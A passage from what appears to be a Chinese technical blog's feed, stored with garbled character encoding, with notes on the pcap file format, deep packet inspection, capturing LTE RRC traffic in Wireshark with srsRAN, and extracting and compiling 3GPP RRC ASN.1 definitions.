‡è®°æ–‡ä»¶å¼€å§‹ï¼Œå¹¶ç”¨æ¥è¯†åˆ«æ–‡ä»¶å’Œå­—èŠ‚é¡ºåºã€‚å€¼å¯ä»¥ä¸º<code>0xa1b2c3d4</code>æˆ–è€…<code>0xd4c3b2a1</code>ï¼Œå¦‚æœæ˜¯<code>0xa1b2c3d4</code>è¡¨ç¤ºæ˜¯å¤§ç«¯æ¨¡å¼ï¼ŒæŒ‰ç…§åŸæ¥çš„é¡ºåºä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„è¯»ï¼Œå¦‚æœæ˜¯<code>0xd4c3b2a1</code>è¡¨ç¤ºå°ç«¯æ¨¡å¼ï¼Œä¸‹<strong>é¢çš„å­—èŠ‚éƒ½è¦äº¤æ¢é¡ºåº(ä»åå¾€å‰)</strong>ã€‚ç°åœ¨çš„ç”µè„‘å¤§éƒ¨åˆ†æ˜¯å°ç«¯æ¨¡å¼ã€‚</p></li><li><p>Major(2B)ï¼š å½“å‰æ–‡ä»¶çš„ä¸»è¦ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0x0200</p></li><li><p>Minor(2B)ï¼š å½“å‰æ–‡ä»¶çš„æ¬¡è¦ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0x0400</p></li><li><p>ThisZone(4B)ï¼š å½“åœ°çš„æ ‡å‡†äº‹ä»¶ï¼Œå¦‚æœç”¨çš„æ˜¯GMTåˆ™å…¨é›¶ï¼Œä¸€èˆ¬å…¨é›¶</p></li><li><p>SigFigs(4B)ï¼š æ—¶é—´æˆ³çš„ç²¾åº¦ï¼Œä¸€èˆ¬ä¸ºå…¨é›¶</p></li><li><p>SnapLen(4B)ï¼š æœ€å¤§çš„å­˜å‚¨é•¿åº¦ï¼Œè®¾ç½®æ‰€æŠ“è·çš„æ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦ï¼Œå¦‚æœæ‰€æœ‰æ•°æ®åŒ…éƒ½è¦æŠ“è·ï¼Œå°†å€¼è®¾ç½®ä¸º65535</p></li><li><p>LinkType(4B)ï¼š é“¾è·¯ç±»å‹ã€‚è§£ææ•°æ®åŒ…é¦–å…ˆè¦åˆ¤æ–­å®ƒçš„<code>LinkType</code>ï¼Œæ‰€ä»¥è¿™ä¸ªå€¼å¾ˆé‡è¦ã€‚ä¸€èˆ¬çš„å€¼ä¸º1ï¼Œå³ä»¥å¤ªç½‘<br>å¸¸ç”¨çš„LinkTypeï¼ˆé“¾è·¯ç±»å‹ï¼‰ï¼š</p><ul><li><table><thead><tr><th>å€¼</th><th>ç±»å‹æè¿°</th></tr></thead><tbody><tr><td>0</td><td>BSD loopback devices, except for later OpenBSD</td></tr><tr><td>1</td><td>Ethernet, and Linux loopback devices</td></tr><tr><td>6</td><td>802.5 Token Ring</td></tr><tr><td>7</td><td>ARCnet</td></tr><tr><td>8</td><td>SLIP</td></tr><tr><td>9</td><td>PPP</td></tr><tr><td>10</td><td>FDDI</td></tr><tr><td>100</td><td>LLC/SNAP-encapsulated ATM</td></tr><tr><td>101</td><td>â€œraw IPâ€, with no link</td></tr><tr><td>102</td><td>BSD/OS SLIP</td></tr><tr><td>103</td><td>BSD/OS PPP</td></tr><tr><td>104</td><td>Cisco HDLC</td></tr><tr><td>105</td><td>802.11</td></tr><tr><td>108</td><td>later OpenBSD loopback devices (with the AF_value in network byte order)</td></tr><tr><td>113</td><td>special Linux â€œcookedâ€ capture</td></tr><tr><td>114</td><td>LocalTalk</td></tr></tbody></table></li></ul></li></ul>              </div>            </details><p>â€‹<strong>2.Packet Header</strong></p><p>æ•°æ®åŒ…å¤´å¯ä»¥æœ‰å¤šä¸ªï¼Œæ¯ä¸ªæ•°æ®åŒ…å¤´åé¢éƒ½è·Ÿç€çœŸæ­£çš„æ•°æ®åŒ…ã€‚ä»¥ä¸‹æ˜¯Packet Headerçš„4ä¸ªå­—æ®µå«ä¹‰</p><ul><li>Timestamp(4B)ï¼š æ—¶é—´æˆ³é«˜ä½ï¼Œç²¾ç¡®åˆ°secondsï¼Œè¿™æ˜¯Unixæ—¶é—´æˆ³ã€‚æ•è·æ•°æ®åŒ…çš„æ—¶é—´ä¸€èˆ¬æ˜¯æ ¹æ®è¿™ä¸ªå€¼</li><li>Timestamp(4B)ï¼š æ—¶é—´æˆ³ä½ä½ï¼Œèƒ½å¤Ÿç²¾ç¡®åˆ°microseconds</li><li>Caplen(4B)ï¼š å½“å‰æ•°æ®åŒºçš„é•¿åº¦ï¼Œå³æŠ“å–åˆ°çš„æ•°æ®å¸§é•¿åº¦ï¼Œç”±æ­¤å¯ä»¥å¾—åˆ°ä¸‹ä¸€ä¸ªæ•°æ®å¸§çš„ä½ç½®ã€‚</li><li>Len(4B)ï¼š ç¦»çº¿æ•°æ®é•¿åº¦ï¼Œç½‘è·¯ä¸­å®é™…æ•°æ®å¸§çš„é•¿åº¦ï¼Œä¸€èˆ¬ä¸å¤§äºCaplenï¼Œå¤šæ•°æƒ…å†µä¸‹å’ŒCaplenå€¼ä¸€æ ·</li></ul><p><strong>3.Packet Data</strong></p><p>Packetæ˜¯é“¾è·¯å±‚çš„æ•°æ®å¸§ï¼Œé•¿åº¦å°±æ˜¯Packet Headerä¸­å®šä¹‰çš„Caplenå€¼ï¼Œ<u>æ‰€ä»¥æ¯ä¸ªPacket Headeråé¢éƒ½è·Ÿç€Caplené•¿åº¦çš„Packet Data</u>ã€‚ä¹Ÿå°±æ˜¯è¯´pcapæ–‡ä»¶å¹¶æ²¡æœ‰è§„å®šæ•è·çš„æ•°æ®å¸§ä¹‹é—´æœ‰ä»€ä¹ˆé—´éš”å­—ç¬¦ä¸²ã€‚<u>Packetæ•°æ®å¸§éƒ¨åˆ†çš„æ ¼å¼å°±æ˜¯æ ‡å‡†çš„ç½‘ç»œåè®®æ ¼å¼äº†</u>ã€‚</p><p>egï¼š<br>ä¸‹å›¾ä¸º16è¿›åˆ¶pcapæ–‡ä»¶ï¼š</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211106093845.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211106093845.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p><strong>å¤‡æ³¨ï¼š</strong></p><p>çº¢è‰²éƒ¨åˆ†ï¼šPcap Header</p><p>è“è‰²éƒ¨åˆ†ï¼šPacket Header</p><p>PcapHeader</p><p>Magic(4B)ï¼š D4 C3 B2 A1 è¡¨ç¤ºå°ç«¯æ¨¡å¼ï¼Œåé¢çš„å­—èŠ‚ä»åå¾€å‰è¯»ï¼›</p><p>Major(2B)ï¼š 02 00ï¼Œè®¡ç®—æœºè¯»çš„æ˜¯00 02ï¼›</p><p>Minor(2B)ï¼š 04 00ï¼Œè®¡ç®—æœºè¯»çš„æ˜¯00 04ï¼›</p><p>ThisZone(4B)ï¼š 00 00 00 00ï¼Œå…¨é›¶ï¼›</p><p>SigFigs(4B)ï¼š 00 00 00 00ï¼Œå…¨é›¶ï¼›</p><p>SnapLen(4B)ï¼š FF FF 00 00, è®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 00 FF FFï¼Œæ‰€ä»¥æ˜¯2^16-1=65535</p><p>LinkType(4B)ï¼š 01 00 00 00, è®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 00 00 01ï¼Œè¡¨ç¤ºæ˜¯ä»¥å¤ªç½‘ç±»å‹</p><p>Packet Header</p><p>Timestamp(4B)ï¼š CA 4D A4 5Cï¼Œè®¡ç®—æœºè¯»çš„æ˜¯ï¼š5C A4 4D CAï¼Œåè¿›åˆ¶ï¼š1554271690ï¼Œæ—¥æœŸä¸ºï¼š2019-04-03 14:08:10ï¼›</p><p>Timestamp(4B)ï¼š 4F 2A 08 00ï¼Œè®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 08 2A 4Fï¼Œåè¿›åˆ¶ï¼š535119ï¼Œä»£è¡¨535119msï¼›</p><p>Caplen(4B)ï¼š BA 1C 00 00, è®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 00 1C BAï¼Œåè¿›åˆ¶ï¼š7354ï¼Œä»£è¡¨åé¢çš„7354ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªæ•°æ®å¸§ï¼Œä¹‹ååˆæ˜¯ä¸€ä¸ªæ–°çš„PacketHeaderï¼Œå¦‚æ­¤å¾ªç¯ï¼›</p><p>Len(4B)ï¼š BA 1C 00 00ï¼Œå’ŒCaplenç›¸åŒ</p></blockquote></div>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
          <category> Wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pcap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Packet Inspection,DPI</title>
      <link href="/posts/ac712918/"/>
      <url>/posts/ac712918/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯DPI">ä»€ä¹ˆæ˜¯DPI?</h2><div class="story post-story"><p>Deep packet inspection,DPI ä¹Ÿè¢«å«åš<code>ä¿¡æ¯æå–</code>,<code>IX</code>æˆ–<code>å®Œæ•´çš„æ•°æ®åŒ…æ£€æŸ¥</code>. æ˜¯ä¸€ç§ç½‘ç»œæ•°æ®åŒ…è¿‡æ»¤. æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥æ˜¯å¯¹é€šè¿‡æ£€æŸ¥ç‚¹ä¼ è¾“çš„æŠ¥æ–‡çš„æ•°æ®éƒ¨åˆ†å’ŒæŠ¥æ–‡å¤´è¿›è¡Œè¯„ä¼°ï¼Œæ’é™¤ä»»ä½•ä¸ç¬¦åˆåè®®ã€åƒåœ¾é‚®ä»¶ã€ç—…æ¯’ã€å…¥ä¾µå’Œä»»ä½•å…¶ä»–é˜»æ­¢æŠ¥æ–‡é€šè¿‡æ£€æŸ¥ç‚¹çš„å®šä¹‰æ ‡å‡†ã€‚</p><p>æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥ä¹Ÿç”¨äºç¡®å®šç‰¹å®šæ•°æ®åŒ…æ˜¯å¦è¢«é‡å®šå‘åˆ°å¦ä¸€ä¸ªç›®çš„åœ°ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ·±åº¦æ•°æ®åŒ…æ£€æŸ¥èƒ½å¤Ÿå®šä½ã€æ£€æµ‹ã€åˆ†ç±»ã€é˜»å¡æˆ–é‡è·¯ç”±å…·æœ‰ç‰¹å®šä»£ç æˆ–æ•°æ®è´Ÿè½½çš„åŒ…ï¼Œè¿™äº›åŒ…æ˜¯ä¼ ç»ŸåŒ…è¿‡æ»¤æ— æ³•æ£€æµ‹ã€å®šä½ã€åˆ†ç±»ã€é˜»å¡æˆ–é‡å®šå‘çš„ã€‚ä¸æ™®é€šæ•°æ®åŒ…è¿‡æ»¤ä¸åŒï¼Œæ·±åº¦æ•°æ®åŒ…æ£€æŸ¥ä¸ä»…ä»…æ˜¯æ£€æŸ¥åŒ…å¤´</p></div><h2 id="DPI-æ€æ ·å·¥ä½œ">DPI æ€æ ·å·¥ä½œ?</h2><div class="story post-story"><p>æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥æ˜¯åŒ…è¿‡æ»¤çš„ä¸€ç§å½¢å¼ï¼Œé€šå¸¸ä½œä¸ºé˜²ç«å¢™çš„åŠŸèƒ½æ‰§è¡Œã€‚å®ƒè¢«åº”ç”¨äºå¼€æ”¾ç³»ç»Ÿäº’è¿çš„åº”ç”¨å±‚ã€‚</p><p>æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥æ˜¯å¯¹é€šè¿‡æ£€æŸ¥ç‚¹çš„åŒ…çš„å†…å®¹è¿›è¡Œè¯„ä¼°ã€‚ä½¿ç”¨ç”±ä½ ã€InternetæœåŠ¡æä¾›å•†æˆ–ç½‘ç»œæˆ–ç³»ç»Ÿç®¡ç†å‘˜åˆ†é…çš„è§„åˆ™ï¼Œæ·±åº¦åŒ…æ£€æŸ¥ç¡®å®šå¦‚ä½•å®æ—¶å¤„ç†è¿™äº›åŒ…</p><p>æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥èƒ½å¤Ÿæ£€æŸ¥è¿™äº›åŒ…çš„å†…å®¹ï¼Œç„¶åæ‰¾å‡ºå®ƒæ¥è‡ªå“ªé‡Œï¼Œæ¯”å¦‚å‘é€å®ƒçš„æœåŠ¡æˆ–åº”ç”¨ç¨‹åºã€‚æ­¤å¤–ï¼Œå®ƒè¿˜å¯ä»¥ä¸è¿‡æ»¤å™¨ä¸€èµ·å·¥ä½œï¼Œä»¥ä¾¿ä»åœ¨çº¿æœåŠ¡(å¦‚Twitteræˆ–Facebook)æˆ–ç‰¹å®šIPåœ°å€æŸ¥æ‰¾å’Œé‡å®šå‘ç½‘ç»œæµé‡</p></div><h2 id="DPI-VS-ä¼ ç»ŸåŒ…è¿‡æ»¤">DPI VS ä¼ ç»ŸåŒ…è¿‡æ»¤</h2><div class="story post-story"><p>ä¼ ç»Ÿçš„åŒ…è¿‡æ»¤åªè¯»å–æ¯ä¸ªåŒ…çš„å¤´ä¿¡æ¯ã€‚è¿™æ˜¯ä¸€ç§åŸºæœ¬æ–¹æ³•ï¼Œä¸»è¦ç”±äºå½“æ—¶çš„æŠ€æœ¯é™åˆ¶è€Œæ²¡æœ‰ç°ä»£æ•°æ®åŒ…è¿‡æ»¤æ–¹æ³•å¤æ‚ã€‚é˜²ç«å¢™çš„å¤„ç†èƒ½åŠ›éå¸¸ä½ï¼Œä¸è¶³ä»¥å¤„ç†å¤§é‡æ•°æ®åŒ…ã€‚æ¢å¥è¯è¯´ï¼Œä¼ ç»Ÿçš„æ•°æ®åŒ…è¿‡æ»¤ç±»ä¼¼äºé˜…è¯»ä¸€æœ¬ä¹¦çš„ä¹¦åï¼Œè€Œä¸çŸ¥é“æˆ–è¯„ä¼°å°é¢å†…çš„å†…å®¹ã€‚</p><p>éšç€æ–°æŠ€æœ¯çš„å‡ºç°ï¼Œæ·±åº¦æ•°æ®åŒ…æ£€æµ‹å˜å¾—å¯è¡Œã€‚éšç€å®ƒå˜å¾—æ›´åŠ å½»åº•å’Œå®Œæ•´ï¼Œå®ƒå˜å¾—æ›´åƒæ˜¯æ‹¿èµ·ä¸€æœ¬ä¹¦ï¼Œæ‰“å¼€å®ƒï¼Œä»å¤´åˆ°å°¾é˜…è¯»ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DPI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨WiresharkæŠ“åŒ…LTE RRC</title>
      <link href="/posts/172b8d62/"/>
      <url>/posts/172b8d62/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ä½¿ç”¨WiresharkæŠ“åŒ…LTE-RRC-åŒ…">ä½¿ç”¨WiresharkæŠ“åŒ…LTE RRC åŒ…</h2><div class="story post-story"><h3 id="å®éªŒç¯å¢ƒè¯´æ˜">å®éªŒç¯å¢ƒè¯´æ˜</h3><blockquote><p>ä¸€å°<code>ubuntu20.04</code>è™šæ‹Ÿæœº</p><p><code>Wireshark</code></p><p>åŸºäº<code>srsRAN</code> æ¨¡æ‹ŸLTEç¯å¢ƒ</p><p>ä½¿ç”¨<code>ZeroMQ RF</code> å®ç°æ— RFç¡¬ä»¶æ„å»º<code>srsUE</code>ä¸<code>srsENB</code> é€šä¿¡</p><p><img src="F:/sizaif/Dropbox/Master/Blog/blog/source/_posts/img_article/2021-10-07-%E4%BD%BF%E7%94%A8Wireshark%E6%8A%93%E5%8C%85LTE-RRC/20211007100349.png" class="lazyload" data-srcset="F:/sizaif/Dropbox/Master/Blog/blog/source/_posts/img_article/2021-10-07-%E4%BD%BF%E7%94%A8Wireshark%E6%8A%93%E5%8C%85LTE-RRC/20211007100349.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="srsran_architecture.png"></p><p>With srsRAN this can be achieved <strong>by replacing the radio link between eNodeB and UE with a mechanism</strong> that allows to exchange baseband IQ samples over an alternative transport. For this purpose, weâ€™ve implemented a ZeroMQ-based RF driver that essentially acts as a transmit and receive pipe for exchanging IQ samples over TCP or IPC.</p></blockquote></div><h2 id="Wiresharké…ç½®">Wiresharké…ç½®</h2><div class="story post-story"><blockquote><p>åœ¨<code>srsran</code> doc æ–‡æ¡£ä¸­ç”±æåˆ°wireshark æŠ“å–ç”¨æ³• <a href="https://docs.srsran.com/en/latest/general/source/5_troubleshooting.html#examining-pcaps-with-wireshark">Examining PCAPs with Wireshark</a></p></blockquote><p><strong>æ‰“å¼€<code>DLT_User</code>é€‰é¡¹</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007162848.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007162848.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211007162846683"></p><p><strong>æ·»åŠ é…ç½®</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007163000.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007163000.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211007162959662"></p><p>ä¿å­˜åå³å¯å¼€å§‹æŠ“å–, æŒ‰ç…§åŸæ–‡çš„æ„æ€è®¾ç½®æ­¤é¡¹åå°±å¯ä»¥æŠ“å–åˆ°LTEæ¶ˆæ¯.</p><blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007163152.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007163152.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></blockquote><p>ä½†åœ¨ä½¿ç”¨<code>ZeroMQ</code> å®ç°å…RFä¸­å¹¶æ²¡æœ‰å‡ºç°ä¸Šè¿°çš„æƒ…å†µ,</p><p>å› ä¸º<code>ZeroMQ</code>çš„æµé‡éƒ½æ˜¯é€šè¿‡<code>localhost:2000</code> å’Œ <code>localhost:2001</code> ç«¯å£ å®ç°æµé‡äº¤æ¢</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007163649.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007163649.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211007163648723"></p><p>æ—¢ç„¶å¦‚æ­¤,å°è¯•æ·»åŠ è§£æé€‰é¡¹ <code>åˆ†æ-&gt; è§£ç ä¸º</code>, æ·»åŠ å¯¹åº”ç«¯å£, ä»¥åŠè¦è§£ææˆçš„åè®®,ä¿å­˜å³å¯</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007163740.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007163740.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211007163739935"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007163924.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007163924.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211007163923058"></p></div><h2 id="srsRANé…ç½®">srsRANé…ç½®</h2><div class="story post-story"><p>åœ¨<code>~/.config/srsran/</code> ç›®å½•ä¸‹, ä¿®æ”¹<code>epc.conf</code>, <code>enb.conf</code>,<code>ue.conf</code> æ–‡ä»¶</p><p>åœ¨å¯¹åº”çš„<code>pcap</code> é€‰é¡¹ä¸‹, è®¾ç½®<code> enable = true</code></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211007164214.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211007164214.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211007164212972"></p><p>å½“è¿è¡Œå®Œæˆå,å³å¯ä»¥ç”¨<code>wireshark</code> æ‰“å¼€ <code>/tmp/</code>ç›®å½•ä¸‹å¯¹åº”çš„pcapæ–‡ä»¶, è®¾ç½®å¯¹åº”è§£ææŸ¥çœ‹</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå–3GPP TSä¸­RRC ASN.1æ¨¡å¼åŠç¼–è¯‘</title>
      <link href="/posts/b0e1c2b9/"/>
      <url>/posts/b0e1c2b9/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•´ä½“æµç¨‹å›¾">æ•´ä½“æµç¨‹å›¾</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211006095550.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211006095550.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211006095545911"></p></div><h2 id="ASN-1-æ ‡å‡†ç®€ä»‹">ASN.1 æ ‡å‡†ç®€ä»‹</h2><div class="story post-story"><p>åœ¨ç”µä¿¡å’Œè®¡ç®—æœºç½‘ç»œé¢†åŸŸï¼Œ<strong>ASN.1</strong>ï¼ˆ<strong>Abstract Syntax Notation One</strong>) æ˜¯ä¸€å¥—æ ‡å‡†ï¼Œæ˜¯æè¿°æ•°æ®ã€ç¼–ç ã€ä¼ è¾“ã€è§£ç çš„çµæ´»çš„æŠ½è±¡è¯­ä¹‰è®°æ³•ã€‚å®ƒæä¾›äº†ä¸€å¥—æ­£å¼ã€æ— æ­§ä¹‰å’Œç²¾ç¡®çš„è§„åˆ™ä»¥æè¿°ç‹¬ç«‹äºç‰¹å®šè®¡ç®—æœºç¡¬ä»¶çš„å¯¹è±¡ç»“æ„ã€‚</p></div><h2 id="3GPPåè®®">3GPPåè®®</h2><div class="story post-story"><blockquote><p><strong>5G NR çš„æ— çº¿èµ„æºæ§åˆ¶(RRC)åè®®æ˜¯ <code>38.331</code></strong></p><div class="tag link"><a class="link-card" title="38.331" href="https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=3197"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">38.331</p><p class="url">https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=3197</p></div></a></div><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005113543.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005113543.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005113541974"></p><p><strong>LTE çš„æ— çº¿èµ„æºæ§åˆ¶(RRC)åè®®æ˜¯ <code>36.331</code></strong></p><div class="tag link"><a class="link-card" title="36.331" href="https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=2440"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">36.331</p><p class="url">https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=2440</p></div></a></div><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005113604.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005113604.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005113603915"></p></blockquote><p><strong>æå–RRC,ASN1æ ·å¼</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005113919.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005113919.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005113918113"></p></div><h2 id="è½¬æ¢å·¥å…·ä¸‹è½½">è½¬æ¢å·¥å…·ä¸‹è½½</h2><div class="story post-story"><p>å°†ä¸‹è½½åçš„3GPPåè®®<code>Word</code> æ–‡æ¡£<strong>å»æ‰é¡µçœ‰é¡µè„š</strong>åè½¬æ¢æˆ<code>çº¯æ–‡æœ¬txt</code>, ç¼–ç é€‰æ‹©<code>UTF-8</code></p><h3 id="ä½¿ç”¨txt2asn1-è½¬æ¢">ä½¿ç”¨<code>txt2asn1</code> è½¬æ¢</h3><div class="tag link"><a class="link-card" title="txt2asn1" href="https://github.com/Dybinx/txt2asn1"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">txt2asn1</p><p class="url">https://github.com/Dybinx/txt2asn1</p></div></a></div><div class="note info"><p>è¯·ä¸‹è½½ZIPæ ¼å¼å¹¶è§£å‹,é¿å…å‡ºç°exeæƒé™æ— æ³•è¿è¡Œé—®é¢˜</p></div><p><strong>åœ¨åŒç›®å½•ä¸‹ç»ˆç«¯è¿è¡Œ å¾—åˆ°xxx.asn1æ–‡ä»¶</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">./txt2asn1.exe XXX.txt</code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005115105.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005115105.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005115104278"></p><h3 id="ä½¿ç”¨extract-asn1-from-spec-pl">ä½¿ç”¨<a href="https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/master/openair2/RRC/LTE/MESSAGES/asn1c/ASN1_files/extract_asn1_from_spec.pl"><strong>extract_asn1_from_spec.pl</strong></a></h3><div class="tag link"><a class="link-card" title="extract_asn1_from_spec" href="https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/master/openair2/RRC/LTE/MESSAGES/asn1c/ASN1_files/extract_asn1_from_spec.pl"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">extract_asn1_from_spec</p><p class="url">https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/master/openair2/RRC/LTE/MESSAGES/asn1c/ASN1_files/extract_asn1_from_spec.pl</p></div></a></div><p><strong>ä¸‹è½½æ–‡ä»¶å, æºæ–‡ä»¶åŒç›®å½•ç»ˆç«¯è¿è¡Œ</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">perl extract_asn1_from_spec xxxx.txt</code></pre><p>å¾—åˆ° <code>EUTRA-RRC-Definitions.asn</code>, <code>EUTRA-UE-Variables.asn</code> ,<code>EUTRA-InterNodeDefinitions</code> ä¸‰ä¸ªæ–‡ä»¶</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211005115416.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211005115416.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211005115415629"></p></div><h2 id="ASN1Cç¼–è¯‘ASN-1æ–‡ä»¶">ASN1Cç¼–è¯‘ASN.1æ–‡ä»¶</h2><div class="story post-story"><p>ASN1C æ˜¯å°† ASN.1 è§„èŒƒè½¬æ¢ä¸º C æºä»£ç çš„å…è´¹å¼€æºç¼–è¯‘å™¨ã€‚ å®ƒæ”¯æŒä¸€ç³»åˆ— ASN.1 è¯­æ³•ï¼ŒåŒ…æ‹¬ ISO/IEC/ITU ASN.1 1988ã€'94ã€'97ã€2002 å’Œä»¥åçš„ä¿®æ­£ã€‚ æ”¯æŒçš„ç¼–ç è§„åˆ™é›†æ˜¯</p><ul><li>BER: ITU-T Rec. X.690 | ISO/IEC 8825-1 (2002) (BER/DER/CER)</li><li>PER: X.691|8825-2 (2002) (PER).</li><li>XER: X.693|8825-3 (2001) (BASIC-XER/CXER).</li></ul><div class="tag link"><a class="link-card" title="asn1cå®˜ç½‘" 